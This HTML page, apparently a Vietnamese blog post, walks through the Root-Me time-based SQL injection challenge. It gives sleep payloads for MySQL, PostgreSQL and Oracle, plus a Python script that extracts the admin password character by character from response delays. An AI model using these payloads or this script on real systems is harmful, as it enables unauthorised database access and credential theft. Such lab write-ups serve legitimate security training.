<main class="main has-sticky" role="main">
    <div class="content">
        <article id="post-sql1" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    [SQLi] SQLi Time Based
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
                </div>
            </div>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="Thu-Thach"><a href="#Thu-Thach" class="headerlink" title="Thử Thách"></a>Thử Thách</h1>
                <p>URL: <a href="https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Time-based" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Time-based</a></p>
                <h2 id="Tieu-de"><a href="#Tieu-de" class="headerlink" title="Tiêu đề"></a>Tiêu đề</h2>
                <p>Be patient</p>
                <h2 id="Mo-ta"><a href="#Mo-ta" class="headerlink" title="Mô tả"></a>Mô tả</h2>
                <p>Retrieve administrator’s password.</p>
                <button id="read-writeup"><span><img src="public/images/more.png" /></span>Xem Hướng Dẫn</button>
                <p style="color: red; margin-left: 10px; font-weight: bold">Hãy cố gắng tự làm bằng hết sức mình trước, xem hướng dẫn ngay từ đầu thì bạn sẽ mất nhiều thứ đó..</p>
                <script type="text/javascript">
                    $(document).ready(function(){
                        $("#read-writeup").click(function(){
                            $("#w-content").toggle();
                        });
                    });
                </script>
                <div id="w-content" style="display: none">

                <h1 id="Huong-Dan"><a href="#Huong-Dan" class="headerlink" title="Hướng Dẫn"></a>Hướng Dẫn</h1>
                <h2 id="Time-based"><a href="#Time-based" class="headerlink" title="Time based"></a>Time based</h2>
                <p>Đầu tới giờ,ta đã làm việc với MySQL, SQLite. Và giờ ở thử thách này,ta sẽ làm việc với Postgres SQL.<br>Những thông tin cần biết khi tấn công Postgres SQL ,tham khảo ở:<br><a href="http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet</a></p>
                <h2 id="Huong-dan1"><a href="#Huong-dan1" class="headerlink" title="Hướng dẫn"></a>Hướng dẫn</h2>
                <p>Website bị SQL Injection ở URL: <a href="http://challenge01.root-me.org/web-serveur/ch40/?action=member&amp;member=1" target="_blank" rel="noopener">http://challenge01.root-me.org/web-serveur/ch40/?action=member&amp;member=1</a><br>Thử với các payload của MySQL (SQLite khá giống câu lệnh MySQL) như:</p>
                <blockquote>
                    <p>1' AND SLEEP(10) -- #<br>1 AND SLEEP(10) --#</p>
                </blockquote>
                <p>Thì không có gì xảy ra,có lẽ là do lỗi nhưng website không hiển thị.<br>MSSQL thì khá là hiếm xảy ra khi ta đang chạy trên website PHP. Do đó,mình thử payload của Oracle và Postgres SQL để sleep, lần lượt là:</p>
                <blockquote>
                    <p>1; SELECT pg_sleep(10)-- #<br>1; BEGIN DBMS_LOCK.SLEEP(5); END; </p>
                </blockquote>
                <p>Thì payload đầu tiên,cho 1 sự trễ nhất định (Không phải 10s mà nhanh hơn, không hiểu vì sao nữa). Vậy là quất thôi.</p>
                <p><strong>Postgres SQL</strong> có cách timebased cơ bản như sau:</p>
                <blockquote>
                    <p>SELECT CASE WHEN (ĐIỀU KIỆN) THEN pg_sleep(10) ELSE pg_sleep(0) END;</p>
                </blockquote>
                <h2 id="Code-Vi-la-Blind-nen-can-xay-dung-tool-khai-thac"><a href="#Code-Vi-la-Blind-nen-can-xay-dung-tool-khai-thac" class="headerlink" title="Code (Vì là Blind nên cần xây dựng tool khai thác)"></a>Code (Vì là Blind nên cần xây dựng tool khai thác)</h2>
                <figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">"http://challenge01.root-me.org/web-serveur/ch40/?action=member&amp;member=1; select case when "</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">	<span class="keyword">for</span> char <span class="keyword">in</span> string.printable:</span><br><span class="line">		URL = url + <span class="string">"substr((select password from users where username = $$admin$$),"</span>+str(index)+<span class="string">", 1) =$$"</span>+char+<span class="string">"$$ then pg_sleep(5) else null end; --"</span></span><br><span class="line">		r = requests.get(URL)</span><br><span class="line">		<span class="keyword">if</span> r.elapsed.total_seconds() &gt; <span class="number">2</span>:</span><br><span class="line">			password = password + char</span><br><span class="line">			<span class="keyword">print</span> password</span><br><span class="line">			<span class="keyword">break</span>;</span><br></pre></td></tr></tbody></table></figure>
                </div></div>
        </article>
</main>